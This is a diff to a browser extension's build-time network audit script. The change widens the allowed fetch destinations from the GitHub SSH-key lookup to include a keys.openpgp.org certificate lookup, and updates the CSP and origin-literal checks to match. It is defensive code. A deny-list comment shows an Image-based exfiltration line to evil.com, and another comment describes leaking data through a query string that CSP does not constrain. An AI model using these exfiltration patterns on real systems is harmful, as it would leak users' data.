@@ -8,12 +8,15 @@
 // get different promises:
 //
 //   worker (the manifest's background.service_worker)
-//     Exactly one `fetch` CALL site beyond the lockdown's own reference.
-//     That call's DESTINATION is resolved statically through the bundle
+//     Exactly two `fetch` CALL sites beyond the lockdown's own reference.
+//     Each call's DESTINATION is resolved statically through the bundle
 //     (parameter → unique call site → `new URL(path, origin)` → literal)
-//     and must come out as `https://api.github.com`; its init object must
-//     match a pinned shape exactly. That call is the GitHub SSH-key
-//     lookup (SECURITY.md §7, §13; T-GITHUB-LOOKUP-DISCLOSURE).
+//     and must come out as one of the two pinned origins — ONE CALL SITE
+//     EACH, so a second GitHub fetch cannot occupy the keyserver's slot;
+//     each init object must match a pinned shape exactly. They are the
+//     GitHub SSH-key lookup and the keys.openpgp.org certificate lookup
+//     (SECURITY.md §7, §13; T-GITHUB-LOOKUP-DISCLOSURE,
+//     T-KEYSERVER-LOOKUP-DISCLOSURE).
 //
 //   page (every other script — side panel, welcome, shared chunks)
 //     No `fetch` beyond the two wasm loaders, and neither may have a
@@ -128,11 +131,28 @@ const DANGEROUS_CONSTRUCTORS = new Set([
   "Image", // new Image().src = "https://evil.com?data=..."
 ]);
 
-// ── The one permitted remote origin ─────────────────────────────────
-// The GitHub SSH-key lookup. Note this is the ORIGIN; the manifest CSP
-// narrows it further to the `/users/` path prefix (which CSP does honour
-// — verified: /users/<u>/keys is allowed, /gists is blocked).
+// ── The permitted remote origins ────────────────────────────────────
+// The two key-discovery lookups, and nothing else. Note these are the
+// ORIGINS; the manifest CSP narrows each one further to a path prefix
+// (which CSP does honour — verified: /users/<u>/keys is allowed,
+// /gists is blocked).
+//
+// EACH ORIGIN GETS THE SAME TREATMENT, and the checks below are written
+// over the list rather than over one name: exactly one built file may
+// contain the literal, that file must be the worker, and the worker's
+// set of remote origin literals must be exactly this list. A third
+// entry is therefore a deliberate edit in several places, not a
+// one-character change.
 const GITHUB_ORIGIN = "https://api.github.com";
+const KEYSERVER_ORIGIN = "https://keys.openpgp.org";
+const WORKER_ORIGINS = [GITHUB_ORIGIN, KEYSERVER_ORIGIN];
+
+/** Path prefix the manifest CSP pins each origin to, in the order the
+ *  `connect-src` directive lists them. */
+const CONNECT_SRC_PATHS = {
+  [GITHUB_ORIGIN]: "/users/",
+  [KEYSERVER_ORIGIN]: "/vks/v1/",
+};
 
 // ── Contexts ────────────────────────────────────────────────────────
 // The worker file is READ FROM THE MANIFEST (`background.service_worker`)
@@ -154,7 +174,10 @@ const EXPECTED_WORKER_FILE = "background.js";
 //   ref:fetch   — `const _fetch = globalThis.fetch` in network-lockdown.ts.
 //                 The lockdown must read the global to replace it; this is
 //                 the reference, not a call.
-//   call:fetch  — lib/github/fetch-keys.ts. THE one outbound request.
+//   call:fetch  — TWO, and only two: lib/github/fetch-keys.ts and
+//                 lib/keyserver/fetch-key.ts. Every outbound request this
+//                 extension can make. Counted together, pinned apart —
+//                 see PINNED_CALL_SITES.
 //
 // page:
 //   ref:fetch              — the same single lockdown reference, landing in
@@ -173,7 +196,7 @@ const EXPECTED_WORKER_FILE = "background.js";
 const EXPECTED_CENSUS = {
   worker: {
     "ref:fetch": 1,
-    "call:fetch": 1,
+    "call:fetch": 2,
   },
   page: {
     "ref:fetch": 1,
@@ -224,6 +247,25 @@ const PINNED_CALL_SITES = {
         cache: "no-store",
       },
       // Non-literal options the call legitimately carries.
+      initOptionalKeys: ["signal", "headers"],
+    },
+    {
+      kind: "call",
+      name: "fetch",
+      reason:
+        "lib/keyserver/fetch-key.ts -- the keys.openpgp.org certificate lookup",
+      // Same pin, different origin. Because a pin must match exactly one
+      // finding AND a finding exactly one pin, the two entries cannot
+      // absorb each other: two fetches to api.github.com leave this pin
+      // unmatched and fail, which is the property a bare count of 2
+      // would not have.
+      destinationOrigin: KEYSERVER_ORIGIN,
+      init: {
+        method: "GET",
+        credentials: "omit",
+        redirect: "error",
+        cache: "no-store",
+      },
       initOptionalKeys: ["signal", "headers"],
     },
   ],
@@ -292,7 +334,7 @@ const EXPECTED_URL_LITERALS = {
   worker: [
     "http://", //
     "chrome-extension://",
-    GITHUB_ORIGIN,
+    ...WORKER_ORIGINS,
   ],
   page: [
     "http://",
@@ -1008,17 +1050,21 @@ function validateManifest(outputDir, manifest) {
     }
   }
 
-  // connect-src must be EXACTLY the extension origin plus the one
-  // path-prefixed GitHub endpoint. Not a substring test: `'self'
-  // https://api.github.com/` (no path) or a second origin appended would
-  // both pass a containment check and both widen the worker's reach.
+  // connect-src must be EXACTLY the extension origin plus the two
+  // path-prefixed lookup endpoints, in this order. Not a substring test:
+  // `'self' https://api.github.com/` (no path) or a third origin appended
+  // would both pass a containment check and both widen the worker's
+  // reach.
   //
   // CSP path-prefix matching is real and was measured: with this policy
   // /users/<u>/keys returns 200 and /gists is blocked. What it does NOT
   // constrain is the query string — /users/x/keys?leak=SECRET is allowed
   // (measured). That residual is inherent to CSP and is recorded as
   // T-GITHUB-CSP-SCOPE rather than papered over here.
-  const EXPECTED_CONNECT_SRC = `connect-src 'self' ${GITHUB_ORIGIN}/users/`;
+  const EXPECTED_CONNECT_SRC = [
+    "connect-src 'self'",
+    ...WORKER_ORIGINS.map((o) => `${o}${CONNECT_SRC_PATHS[o]}`),
+  ].join(" ");
   const connectDirective = csp
     .split(";")
     .map((d) => d.trim().replace(/\s+/g, " "))
@@ -1042,8 +1088,7 @@ function validateManifest(outputDir, manifest) {
   // A `content_security_policy.sandbox` entry, or a top-level `sandbox`
   // block, takes a page OUT of extension_pages entirely: a sandboxed
   // extension page runs in an opaque origin under the sandbox policy, so
-  // `connect-src 'self' https://api.github.com/users/` simply does not
-  // apply to it. That makes either one a complete bypass of everything the
+  // the `connect-src` directive above simply does not apply to it. That makes either one a complete bypass of everything the
   // CSP checks above assert, which is why they are checked as keys that
   // must not exist rather than as policies to be parsed.
   for (const key of Object.keys(cspBlock)) {
@@ -1054,10 +1099,12 @@ function validateManifest(outputDir, manifest) {
     }
   }
 
-  // The GitHub lookup needs NO host permission: api.github.com answers
-  // unauthenticated and sends `access-control-allow-origin: *` (measured:
-  // 200 with `x-ratelimit-limit: 60`, the anonymous limit). So the host
-  // permission keys must be ABSENT, not merely small — along with the
+  // Neither lookup needs a host permission: api.github.com and
+  // keys.openpgp.org both answer unauthenticated and send
+  // `access-control-allow-origin: *` (measured: 200 with
+  // `x-ratelimit-limit: 60` for the former, 200 with `content-type:
+  // application/pgp-keys` for the latter). So the host permission keys
+  // must be ABSENT, not merely small — along with the
   // other manifest keys that can create a network path with no code in
   // the bundle at all.
   for (const [key, reason] of Object.entries(FORBIDDEN_MANIFEST_KEYS)) {
@@ -1118,7 +1165,7 @@ function validatePanelHtml(outputDir) {
       );
     if (!hasMeta) {
       errors.push(
-        'sidepanel.html must carry <meta http-equiv="Content-Security-Policy" content="connect-src \'self\'"> -- without it the panel inherits the worker\'s api.github.com allowance',
+        'sidepanel.html must carry <meta http-equiv="Content-Security-Policy" content="connect-src \'self\'"> -- without it the panel inherits the worker\'s remote-origin allowances',
       );
     }
   } catch {
@@ -1153,7 +1200,7 @@ const workerFile =
   (manifest && manifest.background?.service_worker) || EXPECTED_WORKER_FILE;
 if (workerFile !== EXPECTED_WORKER_FILE) {
   structureErrors.push(
-    `manifest background.service_worker is "${workerFile}", not "${EXPECTED_WORKER_FILE}" -- the worker context moved, so EXPECTED_CENSUS and the single-file api.github.com check must be re-derived before this audit means anything.`,
+    `manifest background.service_worker is "${workerFile}", not "${EXPECTED_WORKER_FILE}" -- the worker context moved, so EXPECTED_CENSUS and the single-file origin-literal checks must be re-derived before this audit means anything.`,
   );
 }
 const contextOf = (rel) => (rel === workerFile ? "worker" : "page");
@@ -1204,7 +1251,9 @@ if (scripts.length === 0) {
 
 const allFindings = [];
 const urlLiterals = { worker: new Map(), page: new Map() };
-const githubOriginFiles = [];
+/** Which built files name each permitted origin. Exactly one apiece,
+ *  and it must be the worker — checked after the scan. */
+const originFiles = Object.fromEntries(WORKER_ORIGINS.map((o) => [o, []]));
 let workerFileSeen = false;
 
 for (const rel of scripts) {
@@ -1226,21 +1275,27 @@ for (const rel of scripts) {
     if (!seen.get(url).includes(rel)) seen.get(url).push(rel);
   }
 
-  if (source.includes(GITHUB_ORIGIN)) githubOriginFiles.push(rel);
+  for (const origin of WORKER_ORIGINS) {
+    if (source.includes(origin)) originFiles[origin].push(rel);
+  }
 
   if (ctx === "worker") {
     workerFileSeen = true;
-    // Self-containment. lib/github/fetch-keys.ts is imported only by the
-    // background entry, so Vite has no reason to hoist it into a shared
-    // chunk — and this check is what makes that reasoning load-bearing
-    // instead of merely likely. It is also what makes the destination
-    // resolver's single-file scope sound. Deliberately NOT an import-graph
-    // walker: the blunt version fails loudly the day someone imports that
-    // module from the panel, which is exactly the day you want to be told.
+    // Self-containment. lib/github/fetch-keys.ts and
+    // lib/keyserver/fetch-key.ts are imported only by the background
+    // entry, so Vite has no reason to hoist either into a shared chunk —
+    // and this check is what makes that reasoning load-bearing instead of
+    // merely likely. It is also what makes the destination resolver's
+    // single-file scope sound. Deliberately NOT an import-graph walker:
+    // the blunt version fails loudly the day someone imports one of those
+    // modules from the panel, which is exactly the day you want to be
+    // told. (`lib/net/capped-body.ts` is shared BETWEEN those two and by
+    // nobody else, so it lands in the same bundle and does not weaken
+    // this.)
     const specifiers = moduleSpecifiersIn(source);
     if (specifiers.length > 0) {
       structureErrors.push(
-        `${rel} is no longer self-contained -- it imports ${specifiers.join(", ")}. Worker code has been split into a shared chunk, so the "one file names api.github.com" guarantee no longer holds. Re-derive it before editing this script.`,
+        `${rel} is no longer self-contained -- it imports ${specifiers.join(", ")}. Worker code has been split into a shared chunk, so the "one file names each permitted origin" guarantee no longer holds. Re-derive it before editing this script.`,
       );
     }
   }
@@ -1448,30 +1503,35 @@ for (const ctx of ["worker", "page"]) {
   }
 }
 
-// The worker's remote origin literals must be exactly the one allowed origin.
-const workerRemoteLiterals = [...urlLiterals.worker.keys()].filter(
-  (u) => originOf(u) !== null,
-);
+// The worker's remote origin literals must be exactly the allowed set --
+// as a SET, so neither a missing one nor an extra one passes.
+const workerRemoteLiterals = [...urlLiterals.worker.keys()]
+  .filter((u) => originOf(u) !== null)
+  .sort();
+const expectedRemoteLiterals = [...WORKER_ORIGINS].sort();
 if (
-  workerRemoteLiterals.length !== 1 ||
-  workerRemoteLiterals[0] !== GITHUB_ORIGIN
+  workerRemoteLiterals.length !== expectedRemoteLiterals.length ||
+  workerRemoteLiterals.some((u, i) => u !== expectedRemoteLiterals[i])
 ) {
   urlErrors.push(
-    `[worker] expected exactly one remote origin literal (${GITHUB_ORIGIN}), found ${JSON.stringify(workerRemoteLiterals)}`,
+    `[worker] expected exactly these remote origin literals (${expectedRemoteLiterals.join(", ")}), found ${JSON.stringify(workerRemoteLiterals)}`,
   );
 }
 
-// Exactly one file in the WHOLE build may name that origin, and it is the
+// Exactly one file in the WHOLE build may name each origin, and it is the
 // worker bundle. See the self-containment check above for why a ten-line
 // test is enough here.
-if (
-  githubOriginFiles.length !== 1 ||
-  githubOriginFiles[0] !== workerFile ||
-  contextOf(githubOriginFiles[0]) !== "worker"
-) {
-  urlErrors.push(
-    `${GITHUB_ORIGIN} must appear in exactly one built file (${workerFile}); found in ${JSON.stringify(githubOriginFiles)}`,
-  );
+for (const origin of WORKER_ORIGINS) {
+  const files = originFiles[origin];
+  if (
+    files.length !== 1 ||
+    files[0] !== workerFile ||
+    contextOf(files[0]) !== "worker"
+  ) {
+    urlErrors.push(
+      `${origin} must appear in exactly one built file (${workerFile}); found in ${JSON.stringify(files)}`,
+    );
+  }
 }
 
 // Validate the manifest and the panel's meta CSP
@@ -1576,7 +1636,7 @@ if (failed > 0) {
 }
 
 console.log(
-  `✅ worker: 1 fetch call site, destination resolves to ${GITHUB_ORIGIN}; no other remote origin nameable.`,
+  `✅ worker: ${WORKER_ORIGINS.length} fetch call sites, one per pinned destination (${WORKER_ORIGINS.join(", ")}); no other remote origin nameable.`,
 );
 console.log(
   "✅ page:   no code that can name a remote destination; 2 wasm loaders only.",
